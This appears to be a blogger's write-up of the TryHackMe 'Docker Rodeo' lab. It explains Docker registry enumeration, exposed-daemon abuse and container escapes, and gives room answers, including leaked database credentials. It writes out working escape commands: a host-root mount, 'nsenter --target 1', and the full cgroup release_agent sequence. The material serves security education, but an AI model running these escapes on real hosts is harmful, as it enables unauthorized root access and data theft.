---
layout: post
title: TryHackMe - Docker Rodeo
tags: THM CTF Docker
---

_Subscriber Room_

This is a room about common docker vulnerabities and their exploitations.

* Added target IP to /etc/hosts as docker-rodeo.thm

## Task 1 - Deploying the machine
Started the machine.

## Task 2 - Understanding Container Basics
Containers do not run on a hypervisor.

## Task 3 - Abusing a Docker Registry
This was a divider and not a real section.

## Task 4 - What is a Docker Registry?
- Docker Registries are used to store and provide published Docker images for use
- One can switch between multiple versions of their applications and share them with other people with ease
- For a Docker repository to pull specific versions, the repository must store the data about every tag
- Docker images are essentially just instruction manuals so they can be reversed to understand what commands took place when the image was being built -- in groups called layers.

## Task 5 - Interacting with a Docker Registry
- Enumerate the services running to understand any potential entry points
- When scanning with Nmap, take note of the API version for the Docker Registry
- The Docker Registry is a JSON endpoint
 - Using a dedicated program such as Postman or Insomnia will make it easier to query the endpoint versus using a terminal or browser
- Read the Docker Registry Documentation to discover what routes are available

**Discovering Repositories**
- Sending a ```GET``` request to ```http://_hostmachine_:5000/v2/_catalog``` will list all the repositories in the registry
- Information types needed
 - Repository Name
 - Published Repository Tags "(if any)"
   - Every repository will have at least one tag
- Sending a ```GET``` request to ```http://_hostmachine_:5000/v2/_repository_/_name_/tags/list``` will show all published tags

**Grabbing the Data**
- Using the repository name and tag name, you can enumerate the specific repository for the manifest file
- Sending a ```GET``` request to ```http://_hostmachine_:5000/v2/_repository_/_name_/mainfests/_tagname_``` will get the manifest for the tag specified

**Questions**
1. What is the port number of the 2nd Docker registry?
 7000
2. What is the name of the repository within this registry?
 securesolutions/webserver
3. What is the name of the tag that has been published? 
 production
4. What is the Username in the database configuration?
 admin
5. What is the Password in the database configuration?
 production_admin

## Task 6 - Reverse Engineering Docker Images
1. What is the "IMAGE_ID" for the "challenge" Docker image that you just downloaded?
 2a0a63ea5d88
2. Using Dive, how many "Layers" are there in this image?
 7
3. What user is successfully added?
 uogctf

## Task 7 - Uploading Malicious Docker Images
- If a repository is vulnerable, we can upload (or push) our own images to a repository, containing malicious code
  - This can allow us to build commands into the container such as a netcat shell 

No task questions.

## Task 8 - RCE via Exposed Docker Daemon
- Unix filesystem sockets are faster than TCP/IP sockets but only interacts with the host itself
- Must be a part of the docker group to use the docker command
- Portainer or Jenkins are applications that allow docker commands to be executed remotely
  - To do this, a TCP/IP socket must be used

Practical Section:
- Enumerate your host thoroughly
 - By default, the engine runs on port 2375
- Confirm vulnerability
 - If port 2375 is open, use ```curl``` to interact with the exposed Docker daemon
   - Interacting with the daemon will give you system information
- Execution
 - perform first command using the ```-H``` switch to specify to the Instance to list running containers
- Experimentation
 - Possible actions:
   - list containers
   - create your own container
   - extract the filesystem to view data
   - execute commands on host
   - run a container
 - Use rootplease tool to create a root shell on the device itself

No task questions.

## Task 9 - Escape via Exposed Docker Daemon
Assumption: foothold has been gained on the container

- Use ```ls -la | grep sock``` to find exposed Docker sockets once you have access to the machine "(via shell or ssh)"
- Verify if current user can run docker commands with ```groups``` command
- Upload alpine image to container you're exploiting
- Mount the host directory to a new container with ```docker run -v /:/mnt --rm -it alpine chroot /mnt sh```
  - This reveals all data on the host OS
- Verify who you're logged in as and enumerate the file system for loot

No task questions. 

## Task 10 - Shared Namespaces
Basics
- Containers have their own networking and file storage
 - This is achieved with these components of the linux kernel
   - Namespaces
   - Cgroups
   - OverlayFS 
- Namespaces segregate system resources such as processes, files, and memory
- Every linux process has a Namespace and a Process Identifier "(PID)"
- You can see the docker process when you run ```ps aux```
- When you run ```ps aux``` in a container there are significantly fewer processes running

Why it matters
- Notable Processes
 - PID 0 - process started at boot
 - PID 1 - processes ```init```, example: ```systemd```
- You can use process 1 on the host OS to escalate privileges
 - Happens when PIDs overlap between containers and host OSes
 - Vulnerability generally relies on having root on the container
- Exploit
 - Use the ```nsenter``` command
   - ```nsenter --target 1 --mount sh``` 
     - ```--target``` with a value of 1 will execute a shell command we later provide to execute in the namespace of the special system process ID, to get ultimate root
     - ```--mount``` is where we provide the namespace we are targetting
     - ```sh``` is the command that will be executed in the privileged namespace "(therefore with the namespace's privileges)"
     - You may need to "Ctrl + C" to cancel the exploit once or twice for this vulnerability to work    

## Task 11 - Miconfigured Privileges
Understanding Capabilities
- Docker can run in two modes
 - User Mode
 - Privileged Mode
- Containers running in User Mode interact with the host OS through the Docker engine
- Containers running in Privileged Mode bypass the Docker engine and have direct communication with the host OS
- If a container is running in Privileged Mode:
 - Can run commands as the root user "(on the OS)"
 - We can use a system package such as "libcap2-bin"'s ```capsh``` to list the capabilities our container has: ```capsh --print```
 - ```capsh --print | grep``` can help you zero in on different capabilities
  - Interesting capabilities:
    - cap_net_admin
    - cap_sys_module
    - cap_sys_admin
    - cap_sys_chroot
    - cap_sys_time
 - [Proof of Concept](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so) 

What's happening during exploitation:
- ```mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x```
 - creates a group to use the Linux kernel to write and execute our exploit
- ```echo 1 > /tmp/cgrp/x/notify_on_release```
 - telling the kernel to execute something once the "cgroup" finishes
- ```host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab` ```
 - find out where the containers files are stored on the host and store it as a variable
- ```echo "$host_path/exploit" > /tmp/cgrp/release_agent```
 - echo the location of the containers files into our "/exploit" and then ultimately to the "release_agent" which is what will be executed by the "cgroup" once it is released
- ```echo '#!/bin/sh' > /exploit```
 - turn the exploit into a shell on the host
- ```echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit```
 - execute a command to echo the host flag into a file named "flag.txt" in the container, once "/exploit" is executed
- ```chmod a+x /exploit``` 
 - make the exploit executable
- ```sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"```
 - create a process and store that into "/tmp/cgrp/x/cgroup.procs"
- Explore the host OS

Task Question:

Contents of "flag.txt" from the host operating system
- thm{y********************s} 

## Task 12 - Securing Your Container
Principle of Least Privilege:
- Commands in docker run as root unless told otherwise
- Give your image the least amount of privileges needed to run
Docker Seccomp 101:
- "Secure Computing" is a feature of the linux kernel
- Docker uses security profiles for containers
 - Can deny actions such as using the mount namespace or any of the Linux system calls
Securing Your Daemon:
- In later docker installs, running a registry relies on a self-signed SSL certificate behind a webserver
- Certificates must be distributed and trusted on every device interacting with the container

## Task 13 - Determining if you're in a Container
- Containers have fewer processes running than the host OS
 - use ```ps aux``` to view running processes
- Look for the .dockerenv file
 - Located in the ```/ ``` directory
 - Use ```cd / && ls -lah``` to view hidden files and folders
- Cgroups are used by containerization software such as Docker or LXC.
 - Look for cgroups by going to ```/proc/1``` and catting the cgroups file
 - The cgroups file contains paths including the word docker

## Task 14 - Additional Material
- [Dirty Cow Exploit](https://github.com/dirtycow/dirtycow.github.io)
- [Exploiting runC (CVE-2019-5736)](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/)
- [Trailofbits' capabilities demonstration](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.)
- [Cgroups 101](https://docs.google.com/presentation/d/1WdByuxWgayPb-RstO-XaENSqVPGP7h6t3GS6W4jk4tk/htmlpresent)
